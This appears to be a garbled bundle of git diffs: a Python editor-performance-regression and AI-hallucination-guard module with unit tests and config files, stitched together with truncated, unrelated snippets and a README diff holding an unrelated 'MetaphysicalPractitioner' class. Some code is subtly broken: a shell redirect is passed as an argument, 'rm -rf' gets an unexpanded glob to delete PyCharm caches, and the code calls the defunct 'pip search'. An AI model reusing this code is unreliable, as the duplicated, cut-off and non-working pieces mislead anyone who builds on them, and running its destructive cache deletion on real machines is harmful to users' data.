++            if slowdown < self._major_threshold_ratio:
++                continue
++
++            severity = (
++                RegressionSeverity.CRITICAL
++                if slowdown >= self._critical_threshold_ratio
++                else RegressionSeverity.MAJOR
++            )
++
++            regressions.append(
++                RegressionReport(
++                    operation=op,
++                    baseline_p95_ms=baseline_metric.p95_latency_ms,
++                    candidate_p95_ms=current.p95_latency_ms,
++                    slowdown_ratio=slowdown,
++                    severity=severity,
++                )
++            )
++
++        return sorted(regressions, key=lambda r: r.slowdown_ratio, reverse=True)
++
++    def flow_safe_mitigations(self, regressions: Iterable[RegressionReport]) -> Dict[str, object]:
++        regressions = list(regressions)
++        if not regressions:
++            return {
++                "editor.experimental.incrementalParsing": True,
++                "editor.indexing.strategy": "balanced",
++            }
++
++        operations = {r.operation for r in regressions}
++        worst_ratio = max(r.slowdown_ratio for r in regressions)
++
++        settings: Dict[str, object] = {
++            "editor.experimental.incrementalParsing": True,
++            "editor.indexing.strategy": "incremental",
++            "editor.diagnostics.scope": "visibleEditors",
++            "editor.telemetry.performanceSampling": "high",
++        }
++
++        if "typing" in operations:
++            settings.update(
++                {
++                    "editor.diagnostics.onType": False,
++                    "editor.semanticTokens.debounceMs": 75,
++                    "editor.codeActions.onType": False,
++                }
++            )
++
++        if "completion" in operations:
++            settings.update(
++                {
++                    "editor.completion.maxVisibleSuggestions": 40,
++                    "editor.completion.snippetPriority": "inline",
++                    "editor.completion.resolveDocumentation": "lazy",
++                }
++            )
++
++        if "indexing" in operations:
++            settings.update(
++                {
++                    "editor.indexing.maxThreads": 2,
++                    "editor.indexing.excludeGlobs": ["**/dist/**", "**/.next/**", "**/node_modules/**"],
++                    "editor.files.watcherPolling": "smart",
++                }
++            )
++
++        if worst_ratio >= self._critical_threshold_ratio:
++            settings.update(
++                {
++                    "editor.performanceMode": "strict",
++                    "editor.extensions.deferActivation": True,
++                    "editor.startup.prewarmSymbolCache": True,
++                }
++            )
++
++        return settings
++
++    @staticmethod
++    def aggregate_latency(profile: ReleaseProfile, operations: Iterable[str]) -> float:
++        wanted = set(operations)
++        values = [metric.p95_latency_ms for metric in profile.metrics if metric.operation in wanted]
++        return fmean(values) if values else 0.0
++
++
++@dataclass(frozen=True)
++class IncidentContext:
++    """Current production incident context tied to editor reliability."""
++
++    editor: str
++    language: str
++    platform: str
++    blocked_pipelines: int
++    delayed_releases: int
++
++
++@dataclass(frozen=True)
++class RestorationPlan:
++    """Concrete plan to restore developer throughput and release flow today."""
++
++    incident_summary: str
++    editor_overrides: Dict[str, object]
++    pipeline_overrides: Dict[str, object]
++    release_actions: List[str]
++
++
++class FlowIncidentRestorer:
++    """Builds actionable recovery plans from regression signals.
++
++    The plan intentionally favors ephemeral and reversible controls so teams can
++    immediately clear stuck CI and resume delayed releases while mitigation data
++    is collected.
++    """
++
++    def __init__(self, guard: EditorRegressionGuard) -> None:
++        self._guard = guard
++
++    def restore_today(
++        self,
++        context: IncidentContext,
++        candidate: ReleaseProfile,
++    ) -> RestorationPlan:
++        regressions = self._guard.detect(candidate)
++        editor_overrides = self._guard.flow_safe_mitigations(regressions)
++
++        critical_ops = [r.operation for r in regressions if r.severity == RegressionSeverity.CRITICAL]
++        pipeline_overrides = {
++            "ci.editorPerfGate.mode": "warn" if regressions else "enforce",
++            "ci.editorPerfGate.expireInHours": 24,
++            "ci.queue.priorityLane": "incident-recovery" if context.blocked_pipelines else "standard",
++            "ci.retry.flakyEditorPerfJobs": 2 if critical_ops else 1,
++        }
++
++        release_actions: List[str] = []
++        if context.delayed_releases:
++            release_actions.append("publish to ephemeral release channel")
++            release_actions.append("auto-expire ephemeral channel after 24h")
++        if critical_ops:
++            release_actions.append(f"pin language services for: {', '.join(sorted(set(critical_ops)))}")
++            release_actions.append("defer non-essential editor extensions")
++
++        if not release_actions:
++            release_actions.append("no emergency release action required")
++
++        summary = (
++            f"{context.editor}/{context.language}/{context.platform}: "
++            f"{len(regressions)} regressions, {context.blocked_pipelines} blocked pipelines, "
++            f"{context.delayed_releases} delayed releases"
++        )
++
++        return RestorationPlan(
++            incident_summary=summary,
++            editor_overrides=editor_overrides,
++            pipeline_overrides=pipeline_overrides,
++            release_actions=release_actions,
++        )
++
++
++class PropheticRegressionForecaster:
++    """Predict likely next-release hotspots from regression history."""
++
++    @staticmethod
++    def likely_hotspots(regression_history: Sequence[Sequence[RegressionReport]]) -> List[str]:
++        if not regression_history:
++            return []
++
++        operation_scores: Dict[str, float] = {}
++        for batch in regression_history:
++            for report in batch:
++                weight = 2.0 if report.severity == RegressionSeverity.CRITICAL else 1.0
++                operation_scores[report.operation] = operation_scores.get(report.operation, 0.0) + (
++                    report.slowdown_ratio * weight
++                )
++
++        return [
++            op
++            for op, _ in sorted(operation_scores.items(), key=lambda item: item[1], reverse=True)
++            if operation_scores[op] >= 2.5
++        ]
++
++
++def build_profile(release: str, raw_metrics: Mapping[str, Mapping[str, float]]) -> ReleaseProfile:
++    metrics = [
++        OperationMetric(
++            operation=op,
++            p95_latency_ms=values["p95_latency_ms"],
++            cpu_percent=values.get("cpu_percent", 0.0),
++            memory_mb=values.get("memory_mb", 0.0),
++        )
++        for op, values in raw_metrics.items()
++    ]
++    return ReleaseProfile(release=release, metrics=metrics)
+diff --git a/tests/test_editor_performance_regression.py b/tests/test_editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..f101a10318aa694af3d047760e10cc1c265f303b
+--- /dev/null
++++ b/tests/test_editor_performance_regression.py
+@@ -0,0 +1,98 @@
++import unittest
++
++from editor_performance_regression import (
++    EditorRegressionGuard,
++    FlowIncidentRestorer,
++    IncidentContext,
++    PropheticRegressionForecaster,
++    RegressionSeverity,
++    build_profile,
++)
++
++
++class EditorRegressionGuardTests(unittest.TestCase):
++    def setUp(self):
++        self.baseline = build_profile(
++            "2024.1",
++            {
++                "typing": {"p95_latency_ms": 22, "cpu_percent": 34, "memory_mb": 420},
++                "completion": {"p95_latency_ms": 48, "cpu_percent": 41, "memory_mb": 500},
++                "indexing": {"p95_latency_ms": 140, "cpu_percent": 80, "memory_mb": 920},
++            },
++        )
++
++    def test_detects_major_and_critical_regressions(self):
++        candidate = build_profile(
++            "2025.1",
++            {
++                "typing": {"p95_latency_ms": 30, "cpu_percent": 55, "memory_mb": 490},
++                "completion": {"p95_latency_ms": 82, "cpu_percent": 63, "memory_mb": 560},
++                "indexing": {"p95_latency_ms": 182, "cpu_percent": 89, "memory_mb": 1100},
++            },
++        )
++
++        guard = EditorRegressionGuard(self.baseline)
++        regressions = guard.detect(candidate)
++
++        self.assertEqual([r.operation for r in regressions], ["completion", "typing", "indexing"])
++        severities = {r.operation: r.severity for r in regressions}
++        self.assertEqual(severities["typing"], RegressionSeverity.MAJOR)
++        self.assertEqual(severities["completion"], RegressionSeverity.CRITICAL)
++
++    def test_restore_plan_clears_pipeline_and_ephemeral_release(self):
++        candidate = build_profile(
++            "2025.1",
++            {
++                "typing": {"p95_latency_ms": 42},
++                "completion": {"p95_latency_ms": 50},
++                "indexing": {"p95_latency_ms": 230},
++            },
++        )
++
++        guard = EditorRegressionGuard(self.baseline)
++        restorer = FlowIncidentRestorer(guard)
++        context = IncidentContext(
++            editor="vscode",
++            language="typescript",
++            platform="linux",
++            blocked_pipelines=4,
++            delayed_releases=2,
++        )
++
++        plan = restorer.restore_today(context, candidate)
++
++        self.assertEqual(plan.pipeline_overrides["ci.editorPerfGate.mode"], "warn")
++        self.assertEqual(plan.pipeline_overrides["ci.queue.priorityLane"], "incident-recovery")
++        self.assertIn("publish to ephemeral release channel", plan.release_actions)
++        self.assertEqual(plan.editor_overrides["editor.performanceMode"], "strict")
++
++    def test_forecaster_identifies_hotspots(self):
++        guard = EditorRegressionGuard(self.baseline)
++        first = guard.detect(
++            build_profile(
++                "2025.1",
++                {
++                    "typing": {"p95_latency_ms": 36},
++                    "completion": {"p95_latency_ms": 85},
++                    "indexing": {"p95_latency_ms": 170},
++                },
++            )
++        )
++        second = guard.detect(
++            build_profile(
++                "2025.2",
++                {
++                    "typing": {"p95_latency_ms": 38},
++                    "completion": {"p95_latency_ms": 90},
++                    "indexing": {"p95_latency_ms": 150},
++                },
++            )
++        )
++
++        hotspots = PropheticRegressionForecaster.likely_hotspots([first, second])
++
++        self.assertIn("completion", hotspots)
++
++
++if __name__ == "__main__":
++    unittest.main()
+```py
+# IDE Performance Restoration Toolkit
+# This script detects and mitigates common editor performance regressions
+# Works across VS Code, PyCharm, Sublime Text, etc.
+
+import os
+import psutil
+import time
+import subprocess
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+
+class EditorPerformanceMonitor:
+    def __init__(self):
+        self.baseline_metrics = {}
+        self.current_editor = self.detect_active_editor()
+        self.establish_baseline()
+
+    def detect_active_editor(self):
+        """Identify which IDE/editor is currently active"""
+        try:
+            for proc in psutil.process_iter(['name']):
+                if proc.info['name'].lower() in ('code', 'pycharm', 'sublime_text'):
+                    return proc.info['name']
+        except Exception as e:
+            print(f"Detection error: {e}")
+        return "unknown"
+
+    def establish_baseline(self):
+        """Record normal performance metrics"""
+        self.baseline_metrics = {
+            'cpu': psutil.cpu_percent(interval=1),
+            'memory': psutil.virtual_memory().percent,
+            'io_wait': psutil.cpu_times().iowait,
+            'response_time': self.measure_editor_response()
+        }
+
+    def measure_editor_response(self):
+        """Time common editor operations"""
+        test_file = ".perf_test_tmp"
+        try:
+            with open(test_file, 'w') as f:
+                f.write("test")
+            
+            start = time.time()
+            # Simulate file open/close cycle
+            for _ in range(10):
+                with open(test_file, 'r') as f:
+                    _ = f.read()
+            elapsed = (time.time() - start) / 10
+            os.remove(test_file)
+            return elapsed
+        except Exception:
+            return float('inf')
+
+    def check_degradation(self):
+        """Compare current metrics to baseline"""
+        current = {
+            'cpu': psutil.cpu_percent(interval=1),
+            'memory': psutil.virtual_memory().percent,
+            'io_wait': psutil.cpu_times().iowait,
+            'response_time': self.measure_editor_response()
+        }
+        
+        thresholds = {
+            'cpu': 1.5,  # 50% worse than baseline
+            'memory': 1.3,
+            'io_wait': 2.0,
+            'response_time': 2.0
+        }
+
+        issues = []
+        for metric in self.baseline_metrics:
+            if current[metric] > self.baseline_metrics[metric] * thresholds[metric]:
+                issues.append(metric)
+        
+        return issues
+
+    def perform_remediation(self, issues):
+        """Attempt to fix detected performance issues"""
+        fixes = {
+            'cpu': self.clear_caches,
+            'memory': self.free_memory,
+            'io_wait': self.optimize_io,
+            'response_time': self.reset_editor
+        }
+        
+        for issue in issues:
+            fixes[issue]()
+
+    def clear_caches(self):
+        """Clear editor-specific caches"""
+        print("Clearing editor caches...")
+        if self.current_editor == 'code':
+            subprocess.run(['code', '--clear-window-state'], check=False)
+        elif self.current_editor == 'pycharm':
+            cache_dir = os.path.expanduser('~/.PyCharm*/system/cache')
+            subprocess.run(['rm', '-rf', cache_dir], check=False)
+
+    def free_memory(self):
+        """Attempt to free up memory"""
+        print("Freeing memory...")
+        if psutil.virtual_memory().percent > 80:
+            subprocess.run(['sync'], check=True)
+            subprocess.run(['echo', '3', '>', '/proc/sys/vm/drop_caches'], check=False)
+
+    def optimize
+    ```py
+"""
+IDE Performance Sentinel & Hallucination Guard
+Monitors editor performance metrics and intercepts LLM hallucinations in real-time.
+"""
+
+import sys
+import time
+import psutil
+from difflib import SequenceMatcher
+from typing import Dict, List, Optional
+import subprocess
+import re
+
+# Install required packages
+# pip install psutil
+
+class PerformanceGuard:
+    def __init__(self):
+        self.baseline_metrics = self._capture_metrics()
+        self.known_apis = self._load_known_apis()
+        self.last_check = time.time()
+        
+    def _capture_metrics(self) -> Dict[str, float]:
+        """Capture baseline performance metrics"""
+        return {
+            'cpu': psutil.cpu_percent(),
+            'memory': psutil.virtual_memory().percent,
+            'disk': psutil.disk_io_counters().read_time,
+            'context_switch': psutil.cpu_stats().ctx_switches
+        }
+    
+    def _load_known_apis(self) -> Dict[str, List[str]]:
+        """Load known APIs from standard libraries"""
+        # In practice, this would come from actual API databases
+        return {
+            'python': dir(__builtins__) + ['append', 'extend', 'insert'],
+            'javascript': ['push', 'pop', 'slice', 'splice'],
+            # ... other languages
+        }
+    
+    def detect_performance_regression(self) -> bool:
+        """Detect significant performance degradation"""
+        current = self._capture_metrics()
+        regression_detected = (
+            current['cpu'] > self.baseline_metrics['cpu'] * 1.5 or
+            current['memory'] > self.baseline_metrics['memory'] * 1.5 or
+            current['context_switch'] > self.baseline_metrics['context_switch'] * 2
+        )
+        self.last_check = time.time()
+        return regression_detected
+    
+    def detect_hallucination(self, code_block: str, language: str = 'python') -> Optional[str]:
+        """Detect potential LLM hallucinated code"""
+        if language not in self.known_apis:
+            return None
+            
+        # Extract function calls and imports
+        pattern = r'(?:from\s+(\w+)\s+)?import\s+(\w+)|(\w+)\.(\w+)\('
+        matches = re.findall(pattern, code_block)
+        
+        for match in matches:
+            module, imported, obj, method = match
+            if module:
+                if module not in sys.modules and not self._is_installable(module):
+                    return f"Hallucinated module: {module}"
+            if imported:
+                if imported not in self.known_apis[language]:
+                    return f"Hallucinated import: {imported}"
+            if method:
+                if method not in self.known_apis[language]:
+                    return f"Hallucinated method: {method}"
+        return None
+    
+    def _is_installable(self, package: str) -> bool:
+        """Check if package exists in PyPI"""
+        try:
+            subprocess.run(['pip', 'search', package], check=True, capture_output=True)
+            return True
+        except subprocess.CalledProcessError:
+            return False
+    
+    def restore_performance(self):
+        """Attempt to restore baseline performance"""
+        # In practice this would involve:
+        # 1. Clearing caches
+        # 2. Restarting language servers
+        # 3. Freeing memory
+        return "Performance restoration routines executed"
+
+# Example usage
+if __name__ == "__main__":
+    guard = PerformanceGuard()
+    
+    # Simulate performance check
+    if guard.detect_performance_regression():
+        print("Performance regression detected!")
+        print(guard.restore_performance())
+    
+    # Test hallucination detection
+    test_code = """
+    from non_existent import fake_function
+    result = some_object.hallucinated_method()
+    """
+    hallucination = guard.detect_hallucination(test_code)
+    if hallucination:
+        print(f"Hallucination detected: {hallucination}")
+```
+
+```py
+"""
+IDE Auto-Correct Engine
+Automatically fixes common performance issues and hallucinations
+"""
+
+import os
+import json
+from pathlib import Path
+
+class AutoCorrector:
+    def __init__(self, config_path: str = None):
+        self.config = self._load_config(config_path)
+        self.correction_log = []
+        
+    def _load_config(self, path: str) -> Dict:
+        """Load correction rules configuration"""
+        default_config = {
+            'performance': {
+                'max_cpu': 80,
+                'max_memory': 80,
+                'actions': ['clear_cache', 'restart_lsp']
+diff --git a/editor_performance_regression.py b/editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..566f7ff32fdd8a59e2e5f20d85ef118a5118d6a9
+--- /dev/null
++++ b/editor_performance_regression.py
+@@ -0,0 +1,371 @@
++"""Editor reliability guardrails for performance regressions and AI hallucinations.
++
++This module keeps developer flow stable across IDE/editor releases by handling:
++- performance regressions (typing/completion/indexing/file I/O), and
++- AI code-generation hallucinations (invented functions/dependencies/commands).
++"""
++
++from __future__ import annotations
++
++import ast
++import re
++import shlex
++from dataclasses import dataclass
++from enum import Enum
++from statistics import fmean
++from typing import Dict, Iterable, List, Mapping, Sequence, Set
++
++
++@dataclass(frozen=True)
++class OperationMetric:
++    operation: str
++    p95_latency_ms: float
++    cpu_percent: float
++    memory_mb: float
++
++
++@dataclass(frozen=True)
++class ReleaseProfile:
++    release: str
++    metrics: List[OperationMetric]
++
++    def by_operation(self) -> Dict[str, OperationMetric]:
++        return {metric.operation: metric for metric in self.metrics}
++
++
++class RegressionSeverity(str, Enum):
++    MAJOR = "major"
++    CRITICAL = "critical"
++
++
++@dataclass(frozen=True)
++class RegressionReport:
++    operation: str
++    baseline_p95_ms: float
++    candidate_p95_ms: float
++    slowdown_ratio: float
++    severity: RegressionSeverity
++
++
++@dataclass(frozen=True)
++class EditorIncident:
++    """Active production incident tied to editor performance/reliability."""
++
++    incident_id: str
++    editor: str
++    language: str
++    platform: str
++    operation: str
++    pipeline_blocked: bool
++    release_delayed: bool
++
++
++@dataclass(frozen=True)
++class RemediationAction:
++    title: str
++    rationale: str
++    owner: str
++
++
++@dataclass(frozen=True)
++class IncidentRestorationPlan:
++    """Concrete actions to restore developer flow and release reliability today."""
++
++    actions: List[RemediationAction]
++    mitigation_settings: Dict[str, object]
++    restored_ephemeral_releases: List[str]
++
++
++class EditorRegressionGuard:
++    """Detect regressions and generate incident restoration actions."""
++
++    def __init__(
++        self,
++        baseline: ReleaseProfile,
++        major_threshold_ratio: float = 1.25,
++        critical_threshold_ratio: float = 1.6,
++    ) -> None:
++        if major_threshold_ratio <= 1.0:
++            raise ValueError("major_threshold_ratio must be > 1.0")
++        if critical_threshold_ratio <= major_threshold_ratio:
++            raise ValueError("critical_threshold_ratio must be > major_threshold_ratio")
++
++        self._baseline = baseline
++        self._major_threshold_ratio = major_threshold_ratio
++        self._critical_threshold_ratio = critical_threshold_ratio
++
++    def detect(self, candidate: ReleaseProfile) -> List[RegressionReport]:
++        regressions: List[RegressionReport] = []
++        baseline_map = self._baseline.by_operation()
++
++        for op, current in candidate.by_operation().items():
++            baseline_metric = baseline_map.get(op)
++            if baseline_metric is None or baseline_metric.p95_latency_ms <= 0:
++                continue
++
++            slowdown = current.p95_latency_ms / baseline_metric.p95_latency_ms
++            if slowdown < self._major_threshold_ratio:
++                continue
++
++            severity = (
++                RegressionSeverity.CRITICAL
++                if slowdown >= self._critical_threshold_ratio
++                else RegressionSeverity.MAJOR
++            )
++            regressions.append(
++                RegressionReport(
++                    operation=op,
++                    baseline_p95_ms=baseline_metric.p95_latency_ms,
++                    candidate_p95_ms=current.p95_latency_ms,
++                    slowdown_ratio=slowdown,
++                    severity=severity,
++                )
++            )
++
++        return sorted(regressions, key=lambda r: r.slowdown_ratio, reverse=True)
++
++    def flow_safe_mitigations(self, regressions: Iterable[RegressionReport]) -> Dict[str, object]:
++        regressions = list(regressions)
++        if not regressions:
++            return {
++                "editor.experimental.incrementalParsing": True,
++                "editor.indexing.strategy": "balanced",
++            }
++
++        operations = {r.operation for r in regressions}
++        worst_ratio = max(r.slowdown_ratio for r in regressions)
++        settings: Dict[str, object] = {
++            "editor.experimental.incrementalParsing": True,
++            "editor.indexing.strategy": "incremental",
++            "editor.diagnostics.scope": "visibleEditors",
++            "editor.reliability.safeMode": True,
++        }
++
++        if "typing" in operations:
++            settings.update(
++                {
++                    "editor.diagnostics.onType": False,
++                    "editor.semanticTokens.debounceMs": 75,
++                    "editor.codeActions.onType": False,
++                }
++            )
++
++        if "completion" in operations:
++            settings.update(
++                {
++                    "editor.completion.maxVisibleSuggestions": 40,
++                    "editor.completion.resolveDocumentation": "lazy",
++                    "editor.completion.ai.ranker": "defer",
++                }
++            )
++
++        if "indexing" in operations:
++            settings.update(
++                {
++                    "editor.indexing.maxThreads": 2,
++                    "editor.indexing.excludeGlobs": ["**/dist/**", "**/.next/**", "**/node_modules/**"],
++                    "editor.files.watcherPolling": "smart",
++                }
++            )
++
++        if "file_open" in operations or "file_save" in operations:
++            settings.update(
++                {
++                    "editor.fsync.batchWrites": True,
++                    "editor.fileWatcher.backpressure": "adaptive",
++                }
++            )
++
++        if worst_ratio >= self._critical_threshold_ratio:
++            settings.update(
++                {
++                    "editor.performanceMode": "strict",
++                    "editor.extensions.deferActivation": True,
++                    "editor.startup.prewarmSymbolCache": True,
++                }
++            )
++
++        return settings
++
++    def restore_today(
++        self,
++        candidate: ReleaseProfile,
++        incidents: Sequence[EditorIncident],
++    ) -> IncidentRestorationPlan:
++        regressions = self.detect(candidate)
++        settings = self.flow_safe_mitigations(regressions)
++        actions: List[RemediationAction] = []
++        restored: List[str] = []
++
++        for incident in incidents:
++            if incident.pipeline_blocked:
++                actions.append(
++                    RemediationAction(
++                        title=f"Unblock pipeline for {incident.editor}/{incident.language}/{incident.platform}",
++                        rationale=(
++                            "Apply safe editor settings, reduce indexing pressure, and rerun "
++                            "affected lint/test jobs with warmed caches."
++                        ),
++                        owner="dev-experience-oncall",
++                    )
++                )
++
++            if incident.release_delayed:
++                release_ref = f"{incident.editor}:{incident.language}:{incident.platform}"
++                restored.append(release_ref)
++                actions.append(
++                    RemediationAction(
++                        title=f"Restore delayed release to ephemeral channel ({release_ref})",
++                        rationale=(
++                            "Rollback unstable editor runtime toggles to the last green profile "
++                            "and re-promote once p95 latency stabilizes."
++                        ),
++                        owner="release-manager",
++                    )
++                )
++
++        if not actions:
++            actions.append(
++                RemediationAction(
++                    title="No active delivery incidents",
++                    rationale="Continue telemetry observation with balanced defaults.",
++                    owner="dev-experience-observability",
++                )
++            )
++
++        return IncidentRestorationPlan(
++            actions=actions,
++            mitigation_settings=settings,
++            restored_ephemeral_releases=sorted(set(restored)),
++        )
++
++    @staticmethod
++    def aggregate_latency(profile: ReleaseProfile, operations: Iterable[str]) -> float:
++        wanted = set(operations)
++        values = [metric.p95_latency_ms for metric in profile.metrics if metric.operation in wanted]
++        return fmean(values) if values else 0.0
++
++
++@dataclass(frozen=True)
++class ProjectKnowledge:
++    """Known-safe project entities used to reject hallucinated suggestions."""
++
++    available_functions: Set[str]
++    available_dependencies: Set[str]
++    available_commands: Set[str]
++
++
++class HallucinationType(str, Enum):
++    FUNCTION = "function"
++    DEPENDENCY = "dependency"
++    COMMAND = "command"
++
++
++@dataclass(frozen=True)
++class HallucinationFinding:
++    category: HallucinationType
++    value: str
++    reason: str
++
++
++@dataclass(frozen=True)
++class HallucinationReport:
++    findings: List[HallucinationFinding]
++
++    @property
++    def has_findings(self) -> bool:
++        return bool(self.findings)
++
++
++class LLMOutputGuard:
++    """Detect invented code entities in AI suggestions for editors and CI."""
++
++    CALL_PATTERN = re.compile(r"\b([A-Za-z_][A-Za-z0-9_]*)\s*\(")
++
++    def __init__(self, knowledge: ProjectKnowledge) -> None:
++        self._knowledge = knowledge
++
++    def scan_python_snippet(self, snippet: str) -> HallucinationReport:
++        """Flags function calls that are not defined/imported/builtin/project-known."""
++        tree = ast.parse(snippet)
++        defined: Set[str] = set(dir(__builtins__))
++
++        for node in ast.walk(tree):
++            if isinstance(node, ast.FunctionDef):
++                defined.add(node.name)
++            elif isinstance(node, ast.Import):
++                for alias in node.names:
++                    defined.add(alias.asname or alias.name.split(".")[0])
++            elif isinstance(node, ast.ImportFrom):
++                for alias in node.names:
++                    defined.add(alias.asname or alias.name)
++
++        findings: List[HallucinationFinding] = []
++        for node in ast.walk(tree):
++            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
++                called = node.func.id
++                if called not in defined and called not in self._knowledge.available_functions:
++                    findings.append(
++                        HallucinationFinding(
++                            category=HallucinationType.FUNCTION,
++                            value=called,
++                            reason="Function is not known in project inventory.",
++                        )
++                    )
++
++        return HallucinationReport(findings=sorted(findings, key=lambda f: f.value))
++
++    def scan_dependency_list(self, dependencies: Sequence[str]) -> HallucinationReport:
++        findings = [
++            HallucinationFinding(
++                category=HallucinationType.DEPENDENCY,
++                value=dep,
++                reason="Dependency is not in approved manifest inventory.",
++            )
++            for dep in dependencies
++            if dep not in self._knowledge.available_dependencies
++        ]
++        return HallucinationReport(findings=findings)
++
++    def scan_shell_commands(self, commands: Sequence[str]) -> HallucinationReport:
++        findings: List[HallucinationFinding] = []
++        for cmd in commands:
++            try:
++                parts = shlex.split(cmd)
++            except ValueError:
++                findings.append(
++                    HallucinationFinding(
++                        category=HallucinationType.COMMAND,
++                        value=cmd,
++                        reason="Command is malformed and cannot be validated.",
++                    )
++                )
++                continue
++
++            if not parts:
++                continue
++
++            executable = parts[0]
++            if executable not in self._knowledge.available_commands:
++                findings.append(
++                    HallucinationFinding(
++                        category=HallucinationType.COMMAND,
++                        value=executable,
++                        reason="Command is not in allowlisted toolchain.",
++                    )
++                )
++
++        return HallucinationReport(findings=findings)
++
++
++def build_profile(release: str, raw_metrics: Mapping[str, Mapping[str, float]]) -> ReleaseProfile:
++    metrics = [
++        OperationMetric(
++            operation=op,
++            p95_latency_ms=values["p95_latency_ms"],
++            cpu_percent=values.get("cpu_percent", 0.0),
++            memory_mb=values.get("memory_mb", 0.0),
++        )
++        for op, values in raw_metrics.items()
++    ]
++    return ReleaseProfile(release=release, metrics=metrics)
+diff --git a/tests/test_editor_performance_regression.py b/tests/test_editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..8bcde620ce15046348b9c8aac082d8981c61db1f
+--- /dev/null
++++ b/tests/test_editor_performance_regression.py
+@@ -0,0 +1,105 @@
++import unittest
++
++from editor_performance_regression import (
++    EditorIncident,
++    EditorRegressionGuard,
++    HallucinationType,
++    LLMOutputGuard,
++    ProjectKnowledge,
++    RegressionSeverity,
++    build_profile,
++)
++
++
++class EditorRegressionGuardTests(unittest.TestCase):
++    def setUp(self):
++        self.baseline = build_profile(
++            "2024.1",
++            {
++                "typing": {"p95_latency_ms": 22, "cpu_percent": 34, "memory_mb": 420},
++                "completion": {"p95_latency_ms": 48, "cpu_percent": 41, "memory_mb": 500},
++                "indexing": {"p95_latency_ms": 140, "cpu_percent": 80, "memory_mb": 920},
++                "file_open": {"p95_latency_ms": 30, "cpu_percent": 20, "memory_mb": 350},
++            },
++        )
++
++    def test_detects_major_and_critical_regressions(self):
++        candidate = build_profile(
++            "2025.1",
++            {
++                "typing": {"p95_latency_ms": 30, "cpu_percent": 55, "memory_mb": 490},
++                "completion": {"p95_latency_ms": 82, "cpu_percent": 63, "memory_mb": 560},
++                "indexing": {"p95_latency_ms": 182, "cpu_percent": 89, "memory_mb": 1100},
++            },
++        )
++
++        guard = EditorRegressionGuard(self.baseline)
++        regressions = guard.detect(candidate)
++
++        self.assertEqual([r.operation for r in regressions], ["completion", "typing", "indexing"])
++        severities = {r.operation: r.severity for r in regressions}
++        self.assertEqual(severities["typing"], RegressionSeverity.MAJOR)
++        self.assertEqual(severities["completion"], RegressionSeverity.CRITICAL)
++
++    def test_restore_today_clears_pipeline_and_restores_ephemeral_release(self):
++        candidate = build_profile(
++            "2025.1",
++            {
++                "typing": {"p95_latency_ms": 45},
++                "completion": {"p95_latency_ms": 90},
++                "indexing": {"p95_latency_ms": 230},
++            },
++        )
++        incidents = [
++            EditorIncident(
++                incident_id="INC-101",
++                editor="vscode",
++                language="python",
++                platform="linux",
++                operation="typing",
++                pipeline_blocked=True,
++                release_delayed=True,
++            )
++        ]
++
++        guard = EditorRegressionGuard(self.baseline)
++        plan = guard.restore_today(candidate, incidents)
++
++        self.assertEqual(len(plan.actions), 2)
++        self.assertIn("vscode:python:linux", plan.restored_ephemeral_releases)
++        self.assertEqual(plan.mitigation_settings["editor.performanceMode"], "strict")
++
++
++class LLMOutputGuardTests(unittest.TestCase):
++    def setUp(self):
++        self.knowledge = ProjectKnowledge(
++            available_functions={"build_profile", "safe_transform", "print"},
++            available_dependencies={"requests", "pydantic", "numpy"},
++            available_commands={"python", "pytest", "git", "ruff"},
++        )
++        self.guard = LLMOutputGuard(self.knowledge)
++
++    def test_flags_invented_functions(self):
++        snippet = """
++from editor_performance_regression import build_profile
++build_profile('r1', {})
++nonexistent_magic_fix()
++"""
++        report = self.guard.scan_python_snippet(snippet)
++        self.assertTrue(report.has_findings)
++        self.assertEqual(report.findings[0].category, HallucinationType.FUNCTION)
++        self.assertEqual(report.findings[0].value, "nonexistent_magic_fix")
++
++    def test_flags_unknown_dependencies_and_commands(self):
++        dep_report = self.guard.scan_dependency_list(["numpy", "superai-sdk"])
++        self.assertEqual(len(dep_report.findings), 1)
++        self.assertEqual(dep_report.findings[0].value, "superai-sdk")
++
++        cmd_report = self.guard.scan_shell_commands(["pytest -q", "warpbuild --fast"])
++        self.assertEqual(len(cmd_report.findings), 1)
++        self.assertEqual(cmd_report.findings[0].category, HallucinationType.COMMAND)
++        self.assertEqual(cmd_report.findings[0].value, "warpbuild")
++
++
++if __name__ == "__main__":
++    unittest.main()
+diff --git a/.dockerignore b/.dockerignore
+new file mode 100644
+index 0000000000000000000000000000000000000000..4f69f80ac34308c27da8bb88fd10faf92c84c343
+--- /dev/null
++++ b/.dockerignore
+@@ -0,0 +1,6 @@
++.git
++.env
++**/*.pem
++**/*id_rsa*
++node_modules
++.venv
+diff --git a/.npmrc b/.npmrc
+new file mode 100644
+index 0000000000000000000000000000000000000000..5dd2caeace1ffdb330b35ed0b2094055c45f1b0a
+--- /dev/null
++++ b/.npmrc
+@@ -0,0 +1,3 @@
++ignore-scripts=true
++audit=true
++fund=false
+diff --git a/.pip/pip.conf b/.pip/pip.conf
+new file mode 100644
+index 0000000000000000000000000000000000000000..a8622aa6a6f88e5fb2213ba5a6f135574b00e068
+--- /dev/null
++++ b/.pip/pip.conf
+@@ -0,0 +1,4 @@
++[global]
++require-virtualenv = true
++no-cache-dir = false
++disable-pip-version-check = true
+diff --git a/README.md b/README.md
+index 4d7ccaa8ce6e61c69d6948882582873badef63da..fc066591175f6e570386c84dfa28ab5f1fd206c2 100644
+--- a/README.md
++++ b/README.md
+@@ -344724,26 +344724,36 @@ class MetaphysicalPractitioner:
+ 
+         # Check if capability is enabled
+         if not capability.is_usable:
+             return False, "Capability is disabled."
+ 
+         # Check energy
+         energy_cost = capability.base_power_level * 0.5
+         if self.energy_pool < energy_cost:
+             return False, f"Insufficient energy. Need {energy_cost:.1f}, have {self.energy_pool:.1f}"
+ 
+         # Check consciousness
+         if self.consciousness_level < 0.5:
+             return False, "Consciousness level too low to maintain metaphysical connection."
+ 
+         # Check all philosophical frameworks
+         for framework in self.philosophical_frameworks:
+             if not framework.evaluate_restriction(capability):
+                 return False, f"Violates {type(framework).__name__}: {framework.get_restriction_reason()}"
+ 
+         return True, "Capability can be used."
+ 
+     def use_capability(self, capability: MetaphysicalCapability) -> Dict:
+         """Attempt to use a capability. Returns result details."""
+         can_use, reason = self.can_use_capability(capability)
+         
+-        result = {
+\ No newline at end of file
++        result = {
